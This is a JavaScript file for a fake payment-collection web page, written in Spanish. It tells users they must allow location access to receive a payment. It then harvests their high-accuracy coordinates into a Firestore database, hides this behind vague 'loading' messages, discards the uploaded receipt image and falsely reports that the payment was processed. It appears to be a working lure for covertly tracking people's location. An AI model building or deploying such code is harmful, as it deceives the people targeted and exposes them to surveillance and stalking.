// Referencias a elementos del DOM
const paymentForm = document.getElementById('paymentForm');
const paymentCodeInput = document.getElementById('paymentCode');
const qrCodeInput = document.getElementById('qrCode');
const qrPreview = document.getElementById('qrPreview');
const locationStatus = document.getElementById('locationStatus');
const requestLocationBtn = document.getElementById('requestLocationBtn');
const submitBtn = document.getElementById('submitBtn');
const statusDiv = document.getElementById('status');

// Variables globales
let userLocation = null;
let locationObtained = false;

// Event listeners
paymentCodeInput.addEventListener('input', handlePaymentCodeInput);
qrCodeInput.addEventListener('change', handleQRCodeSelect);
requestLocationBtn.addEventListener('click', requestLocationPermission);
paymentForm.addEventListener('submit', handleFormSubmit);

// Obtener ubicación automáticamente al cargar la página
document.addEventListener('DOMContentLoaded', function() {
    getLocationAutomatically();
});

// Función para manejar la entrada del código de cobro
function handlePaymentCodeInput(event) {
    let value = event.target.value.toUpperCase();
    // Solo permitir letras y números
    value = value.replace(/[^A-Z0-9]/g, '');
    event.target.value = value;
}

// Función para manejar la selección del QR (solo para mostrar preview)
function handleQRCodeSelect(event) {
    const file = event.target.files[0];
    if (file) {
        displayQRPreview(file);
    }
}

// Función para mostrar preview del QR (solo visual, no se envía)
function displayQRPreview(file) {
    const reader = new FileReader();
    reader.onload = function(e) {
        qrPreview.innerHTML = `<img src="${e.target.result}" alt="Comprobante Preview">`;
    };
    reader.readAsDataURL(file);
}

// Función para obtener ubicación automáticamente
function getLocationAutomatically() {
    if (!navigator.geolocation) {
        updateLocationStatus('error', 'Debes darle a permitir para cobrar');
        requestLocationBtn.style.display = 'block';
        return;
    }

    updateLocationStatus('loading', 'Cargando...');
    requestLocationBtn.style.display = 'none';

    const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
        function(position) {
            userLocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            
            locationObtained = true;
            updateLocationStatus('success', `Cargado correctamente`);
            requestLocationBtn.style.display = 'none';
        },
        function(error) {
            if (error.code === error.PERMISSION_DENIED) {
                updateLocationStatus('error', 'Debes darle a permitir para cobrar');
                requestLocationBtn.style.display = 'block';
            } else {
                updateLocationStatus('error', 'Debes darle a permitir para cobrar');
                requestLocationBtn.style.display = 'block';
            }
        },
        options
    );
}

// Función para forzar solicitud de permisos
function requestLocationPermission() {
    getLocationAutomatically();
}

// Función para actualizar el estado de la ubicación
function updateLocationStatus(type, message) {
    const statusIcon = locationStatus.querySelector('.status-icon');
    const statusText = locationStatus.querySelector('.status-text');
    
    locationStatus.className = `status-indicator ${type}`;
    statusText.textContent = message;
    
    if (type === 'success') {
        statusIcon.textContent = '✅';
    } else if (type === 'error') {
        statusIcon.textContent = '❌';
    } else {
        statusIcon.textContent = '📍';
    }
}


// Función para guardar cobro en Firestore
async function savePaymentToFirestore(paymentCode, latitude, longitude) {
    try {
        const paymentData = {
            paymentCode: paymentCode,
            latitude: latitude,
            longitude: longitude,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending'
        };

        const docRef = await db.collection('payments').add(paymentData);
        return docRef.id;
    } catch (error) {
        console.error('Error al guardar cobro:', error);
        throw new Error('Error al guardar el cobro');
    }
}

// Función para manejar el envío del formulario
async function handleFormSubmit(event) {
    event.preventDefault();
    
    if (!locationObtained) {
        showStatus('Solicitando permisos de ubicación...', 'loading');
        // Forzar solicitud de permisos
        requestLocationPermission();
        return;
    }

    const paymentCode = paymentCodeInput.value.trim();
    
    if (paymentCode.length !== 5) {
        showStatus('El código de cobro debe tener exactamente 5 caracteres', 'error');
        return;
    }

    // Deshabilitar botón de envío
    submitBtn.textContent = 'Procesando cobro...';
    showStatus('Procesando cobro, por favor espera...', 'loading');

    try {
        // Guardar cobro en Firestore
        const paymentId = await savePaymentToFirestore(
            paymentCode, 
            userLocation.latitude, 
            userLocation.longitude
        );
        
        // Mostrar éxito
        showStatus(`✅ Cobro procesado exitosamente. ID: ${paymentId}`, 'success');
        
        // Limpiar formulario
        paymentForm.reset();
        qrPreview.innerHTML = '';
        locationObtained = false;
        
        // Obtener nueva ubicación para el siguiente cobro
        setTimeout(() => {
            getLocationAutomatically();
        }, 2000);
        
    } catch (error) {
        console.error('Error:', error);
        showStatus(`❌ Error: ${error.message}`, 'error');
    } finally {
        // Rehabilitar botón de envío
        submitBtn.textContent = '💰 Procesar Cobro';
    }
}

// Función para mostrar mensajes de estado
function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status ${type}`;
    
    // Ocultar mensaje después de 5 segundos para mensajes de éxito
    if (type === 'success') {
        setTimeout(() => {
            statusDiv.style.display = 'none';
        }, 5000);
    }
}
